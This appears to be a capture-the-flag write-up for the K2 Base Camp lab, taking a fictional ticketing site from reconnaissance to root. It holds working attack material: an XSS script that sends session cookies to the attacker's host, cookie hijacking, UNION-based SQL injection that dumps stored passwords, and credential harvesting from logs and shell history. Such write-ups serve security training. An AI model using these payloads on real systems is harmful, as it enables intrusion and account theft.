---
title: Base Camp
layout: default
parent: Hard.
nav_order: 1
---

# Tags, ``

# K2 Base Camp

**Mini description**: 
You have been asked to run a vulnerability test on the K2 network in order to see if there is any way that a malicious actor would be able to infiltrate.

The IT team assures you that the network is secure and that you won't be able to make your way up the mountain.

They have only provided you with their external website called k2.thm

## Configure
`/etc/hosts`
```
<IP-ADDRESS> k2.thm
```

## Find Ports
`nmap -sS -p- -T4 -sC -sV 10.82.182.96`
```diff
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 06:58 -0600
Nmap scan report for 10.82.182.96
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fb:52:02:e8:d9:4b:83:1a:52:c9:9c:b8:43:72:83:71 (RSA)
|   256 37:94:6e:99:c2:4f:24:56:fd:ac:77:e2:1b:ec:a0:9f (ECDSA)
|_  256 8f:3b:26:92:67:ec:cc:05:30:27:17:c5:df:9a:42:d2 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Dimension by HTML5 UP
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 391.47 seconds
```
## Find subdomains
`gobuster vhost -u http://k2.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`
```diff
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://k2.thm
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
+admin.k2.thm Status: 200 [Size: 967]
+it.k2.thm Status: 200 [Size: 1083]
-#www.k2.thm Status: 400 [Size: 166]
-#mail.k2.thm Status: 400 [Size: 166]
-#smtp.k2.thm Status: 400 [Size: 166]
-#pop3.k2.thm Status: 400 [Size: 166]
Progress: 114442 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

## Reconfigure
`/etc/hosts`
```
<IP-ADDRESS> k2.thm admin.k2.thm it.k2.thm
```

## Find folders & files
`gobuster dir --url http://admin.k2.thm -w /usr/share/wordlists/dirb/big.txt`
```diff
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.k2.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
+dashboard            (Status: 302) [Size: 199] [--> /login]
+login                (Status: 200) [Size: 967]
+logout               (Status: 302) [Size: 199] [--> /login]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```
`gobuster dir --url http://it.k2.thm -w /usr/share/wordlists/dirb/big.txt`
```diff
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://it.k2.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
+dashboard            (Status: 302) [Size: 199] [--> /login]
+login                (Status: 200) [Size: 1083]
+logout               (Status: 302) [Size: 199] [--> /login]
+register             (Status: 200) [Size: 1189]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```

## XSS Testing, ...
1. `python3 -m http.server 80`
1. Ticket system Form
    - `<img src=”http://<ATTACK-IP-ADDRESS>/title"></img>`
    - `<img src="http://<ATTACK-IP-ADDRESS>/desc"></img>`
1. **Python HTTP Server**: The description field is vulnerable to XSS, ...
    ```
    10.81.182.207 - - [28/Jan/2026 23:02:02] "GET /desc HTTP/1.1" 404 -
    10.81.182.207 - - [28/Jan/2026 23:02:04] code 404, message File not found
    ```
1. Ticket system Form
    1. `xss.js`
        ```
        fetch("http://10.80.73.125/?c="+btoa(document.cookie));
        ```
    1. `<script src="http://10.80.73.125/xss.js"></script>`
1. **Python HTTP Server**: The description field
    ```
    10.80.169.137 - - [29/Jan/2026 01:38:10] "GET /xss.js HTTP/1.1" 200 -
    10.80.169.137 - - [29/Jan/2026 01:38:10] "GET /?c=c2Vzc2lvbj1leUpoWkcxcGJsOTFjMlZ5Ym1GdFpTSTZJbXBoYldWeklpd2lhV1FpT2pFc0lteHZaMmRsWkdsdUlqcDBjblZsZlEuYVhxNkFnLkVPQjU4T010a2NMUVJFNkdOMVhiU0I4UVExNA== HTTP/1.1" 200 -
    ```
1. Base64
    ```
    c2Vzc2lvbj1leUpoWkcxcGJsOTFjMlZ5Ym1GdFpTSTZJbXBoYldWeklpd2lhV1FpT2pFc0lteHZaMmRsWkdsdUlqcDBjblZsZlEuYVhxNkFnLkVPQjU4T010a2NMUVJFNkdOMVhiU0I4UVExNA==
    ```
    - `session=eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aXq6Ag.EOB58OMtkcLQRE6GN1XbSB8QQ14`
## Cookies
1. Create a cookie

    |Name|Value|
    |---|---|
    |session|eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aXq6Ag.EOB58OMtkcLQRE6GN1XbSB8QQ14|
## SQL
1. Navigate to `http://admin.k2.thm/dashboard`
    - The column count is 3, 
        ```sql
        a' UNION SELECT 1,2,3;#
        ```
        ```html
        <tbody>
            <tr>
                <td>1</td>
                <td>2</td>
                <td>3</td>
                <!-- Use appropriate indices for ticket data -->
            </tr>
        </tbody>
        ```
    - Shows the database names
        ```sql
        title=a' UNION SELECT 1,group_concat(schema_name),3 from information_schema.schemata;#
        ```
        ```html
        <tbody>
            <tr>
                <td>1</td>
                <td>information_schema,performance_schema,ticketsite</td>
                <td>3</td>
                <!-- Use appropriate indices for ticket data -->
            </tr>
        </tbody>
        ```
        - `information_schema`
        - `performance_schema`
        - `ticketsite`
    - Check the tables in the `ticketsite` database
        ```sql
        title=a' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema='ticketsite';#
        ```
        ```html
        <tbody>
            <tr>
                <td>1</td>
                <td>admin_auth,auth_users,tickets</td>
                <td>3</td>
                <!-- Use appropriate indices for ticket data -->
            </tr>
        </tbody>
        ```
        - `admin_auth`
        - `auth_users`
        - `tickets`
    - Extract the column names for the `ticketsite.admin_auth` table
        ```sql
        title=a' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema='ticketsite' and table_name='admin_auth';#
        ```
        ```html
        <tbody>
            <tr>
                <td>1</td>
                <td>id,admin_username,admin_password,email</td>
                <td>3</td>
                <!-- Use appropriate indices for ticket data -->
            </tr>
        </tbody>
        ```
        - `id`
        - `admin_username`
        - `admin_password`
        - `email`
    - Dump the table
        ```sql
        title=a' UNION SELECT 1,group_concat(admin_username,':',admin_password,':',email,':',id SEPARATOR '\n'),3 from ticketsite.admin_auth;#
        ```
        ```html
        <tbody>
            <tr>
                <td>1</td>
                <td>
                    james:Pwd@9tLNrC3!:james@k2.thm:1 
                    rose:VrMAogdfxW!9:rose@k2.thm:2 
                    bob:PasSW0Rd321:bob@k2.thm:3
                    steve:St3veRoxx32:steve@k2.thm:4 
                    cait:PartyAlLDaY!32:cait@k2.thm:5 
                    xu:L0v3MyDog!3!:xu@k2.thm:6
                    ash:PikAchu!IshoesU!:ash@k2.thm:7
                </td>
                <td>3</td>
                <!-- Use appropriate indices for ticket data -->
            </tr>
        </tbody>
        ```
## What is the user flag?
1. `sshpass -p "Pwd@9tLNrC3!" ssh james@10.82.147.166`
1. `cat user.txt`
    ```diff
    +THM{9e04a7419a2b7a86163496271a8a95dd}
    ```
## What is the root flag?
1. `cd /var/log/nginx`
1. `grep -r -e "GET" *`
    ```
    access.log.1:10.0.2.51 - - [24/May/2023:22:17:17 +0000] "GET /login?username=rose&password=RdzQ7MSKt)fNaz3! HTTP/1.1" 200 1356 "http://admin.k2.thm/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
    ```
    - `rose`:`RdzQ7MSKt)fNaz3!`
1. `su -`, `RdzQ7MSKt)fNaz3!`
1. `cat root.txt`
    ```diff
    +THM{c6f684e3b1089cd75f205f93de9fe93d}
    ```
## What are the usernames and passwords that had access to the server? List the usernames in alphabetical order with their corresponding password separated by a comma. Format is username:password.
1. `cat rose/.bash_history`
    ```diff
    sudo suvRMkaVgdfxhW!8
    sudo su
    ```
1. List
    ```
    james:Pwd@9tLNrC3!,root:RdzQ7MSKt)fNaz3!,rose:vRMkaVgdfxhW!8
    ```
## Two users have their full names on display. What are their names? In Alphabetical order. Format is first name last name separated by a comma.
1. `grep -e "/bin/bash" /etc/passwd`
    ```diff
    root:x:0:0:root:/root:/bin/bash
    rose:x:1001:1001:Rose Bud:/home/rose:/bin/bash
    james:x:1002:1002:James Bold:/home/james:/bin/bash
    ```
1. List
    ```
    James Bold,Rose Bud
    ```
## URLs Found
- `http://k2.thm/static/css`
    - `http://k2.thm/static/css/main.css`
    - `http://k2.thm/static/css/fontawesome-all.min.css`
- `http://k2.thm/static/js`
    - `http://k2.thm/static/js/main.js`
    - `http://k2.thm/static/js/util.js`
    - `http://k2.thm/static/js/breakpoints.min.js`
    - `http://k2.thm/static/js/browser.min.js`
    - `http://k2.thm/static/js/jquery.min.js`
- `http://k2.thm/static/images`
    - `http://k2.thm/static/images/bg.jpg`
    - `http://k2.thm/static/images/overlay.png`
    - `http://k2.thm/static/images/pic01.jpg`
    - `http://k2.thm/static/images/pic02.jpg`
    - `http://k2.thm/static/images/pic03.jpg`
- `http://it.k2.thm`
    - `http://it.k2.thm/register` - You can create an account with any email address.
    - `http://it.k2.thm/dashboard` - Ticket system
- `http://admin.k2.thm`
    - `http://admin.k2.thm/login`

## Web Site Articles
- `http://k2.thm/#intro`
- `http://k2.thm/#work`
- `http://k2.thm/#about`
- `http://k2.thm/#contact`
- `http://k2.thm/#elements`